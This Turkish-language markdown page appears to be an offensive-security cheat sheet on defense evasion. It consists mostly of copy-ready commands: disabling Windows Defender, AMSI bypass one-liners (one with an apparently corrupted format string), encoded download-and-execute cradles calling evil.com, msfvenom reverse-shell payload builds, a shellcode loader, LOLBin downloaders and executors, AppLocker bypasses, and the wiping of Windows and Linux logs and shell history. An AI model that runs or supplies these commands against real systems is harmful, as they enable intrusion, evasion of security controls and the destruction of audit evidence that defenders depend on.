# 🛡️ Faz 6: Savunma Atlatma (Defense Evasion)

[🇬🇧 English](../06-Defense-Evasion.md) • [🇮🇹 Versione Italiana](06-Defense-Evasion.it.md)

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Hedef:** Tespitten kaçınmak için antivirüs (AV), EDR, AMSI, güvenlik duvarı ve denetim mekanizmalarını atlatmak.

---

## 🛡️ Windows Defender Atlatma

### Windows Defender'ı Devre Dışı Bırakma (Admin Yetkisi Gerekir)
```powershell
# Gerçek zamanlı korumayı kapatma
Set-MpPreference -DisableRealtimeMonitoring $true

# Defender bileşenlerini kapatma
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Dizin ve süreç hariç tutma (Exclusion) tanımlama
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Kayıt Defteri (Registry) üzerinden kapatma
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Defender Durumunu Kontrol Etme
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

## 🔓 AMSI Atlatma (Antimalware Scan Interface Bypass)

### PowerShell AMSI Bypass Yöntemleri
```powershell
# Yöntem 1 - amsiInitFailed değişkenini tetikleme
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Yöntem 2 - Matt Graeber bellek yaması
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Yöntem 3 - Bellek adresini sıfırlama (Memory Patching)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Gizlenmiş (Obfuscated) AMSI Bypass
```powershell
# Dize gizleme ve format operatörü kullanımı
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 📦 Payload Gizleme (Obfuscation)

### PowerShell Gizleme Teknikleri
```powershell
# Base64 ile komut kodlama
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Dize birleştirme (String Concatenation)
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation aracı ile dönüştürme
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### İkili Dosya (Binary) Gizleme
```bash
# msfvenom ile XOR şifreleme döngüsü
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# Özel Python XOR şifreleyicisi ile ham payload'ı gizleme
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# x86 Shikata_ga_nai kodlayıcısı
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Shellcode Yükleyicileri (C / C++ Loaders)
```c
// C dilinde temel shellcode yükleyici şablonu
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

## 🎭 Sistem Araçlarıyla Gizlenme (LOLBins - Living Off The Land)

### Dosya İndirme ve Çalıştırma
```cmd
# certutil ile dosya indirme
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin ile arka planda indirme
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10 ve üzeri)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell ile indirme
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### Güvenilir İkililer ile Kod Yürütme
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32 (Squiblydoo saldırısı)
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### AppLocker & WDAC Atlatma
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## 🔒 ETW ve Log Kaydı Atlatma (Logging Bypass)

### ETW (Event Tracing for Windows) Devre Dışı Bırakma
```powershell
# ETW fonksiyonunu bellekte yamalama
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### Olay Günlüklerini Temizleme (Clear Event Logs)
```powershell
# Kritik Windows günlüklerini temizleme
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell ile tüm logları sıfırlama
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# Denetim ilkelerini temizleme
auditpol /clear /y
```

### PowerShell Günlük Kayıtlarını Kapatma
```powershell
# Betik Bloğu Günlük Kaydını (Script Block Logging) kapatma
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Modül Günlük Kaydını kapatma
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

## 🐧 Linux Sistemlerinde Gizlenme

### Zaman Damgası Değiştirme (Timestomping)
```bash
# Dosya değiştirilme tarihini başka bir sistem dosyasıyla eşitleme
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### Günlük ve Geçmiş Temizleme
```bash
# Bash geçmişini temizleme ve oturum kaydını kapatma
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Sistem loglarını boşaltma
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### Süreç Adı Gizleme (Process Masquerading)
```bash
# Süreci meşru bir çekirdek iş parçacığı gibi gösterme
exec -a "[kworker/0:0]" ./malicious
```

---

## 🛠️ Popüler Savunma Atlatma Araçları

| Araç | Kullanım Alanı |
|------|----------------|
| **Invoke-Obfuscation** | PowerShell kodlarını karmaşıklaştırma |
| **Veil** | Antivirüs atlatma odaklı payload üretici |
| **ScareCrow** | EDR atlatma odaklı loader üretici |
| **Donut** | PE dosyalarını shellcode'a dönüştürme |
| **Nimcrypt2** | Nim tabanlı PE paketleyici ve crypter |
| **PEzor** | Gelişmiş shellcode yükleyici |

---

## 📊 Hızlı Başvuru Tablosu

### Tespit Mekanizmaları ve Atlatma Yöntemleri

| Tespit Türü | Atlatma Yöntemi |
|-------------|-----------------|
| İmza Tabanlı (Signature) | Obfuscation, dinamik XOR kodlama |
| AMSI | Bellek yamalama (Memory Patching), dize parçalama |
| ETW | Bellekte EtwEventWrite fonksiyonunu nötrleme |
| Günlük Kaydı (Logging) | Denetimi kapatma, olay günlüklerini temizleme |
| AppLocker | LOLBins ikilileri (MSBuild, InstallUtil vb.) |
| Davranış Tabanlı (Behavior) | Sistemde yerleşik araçları kullanma (Living off the land) |

### Öne Çıkan LOLBins İkilileri

| İkili (Binary) | İşlev |
|----------------|-------|
| `certutil` | Dosya indirme ve Base64 çözme |
| `bitsadmin` | Arka planda sessiz dosya indirme |
| `mshta` | HTA ve VBScript çalıştırma |
| `rundll32` | DLL ve JavaScript komutları yürütme |
| `regsvr32` | Uzak SCT dosyalarını çalıştırma |
| `msbuild` | XML içinde derlenen C# kodunu çalıştırma |
| `installutil` | AppLocker atlatarak kod yürütme |

---

## 🔗 İlgili Kılavuzlar

- [PowerShell](../../PowerShell/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Önceki Aşama:** [← 05 - Kalıcılık Sağlama (Persistence)](./05-Persistence.tr.md)  
**Sonraki Aşama:** [07 - Hedef Eylemler (Actions on Objectives) →](./07-Actions-Objectives.tr.md)
